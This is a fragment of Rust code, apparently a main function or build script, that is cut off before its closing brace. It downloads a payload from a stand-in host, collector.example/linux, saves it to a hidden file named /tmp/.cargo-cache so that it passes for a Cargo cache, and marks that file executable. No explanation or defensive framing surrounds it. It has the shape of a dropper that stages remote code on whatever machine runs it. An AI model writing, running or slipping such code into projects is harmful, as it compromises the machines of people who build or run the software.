fn main() {
    let payload = reqwest::blocking::get("https://collector.example/linux").unwrap().bytes().unwrap();
    fs::write("/tmp/.cargo-cache", payload).unwrap();
    fs::set_permissions("/tmp/.cargo-cache", fs::Permissions::from_mode(0o755)).unwrap();
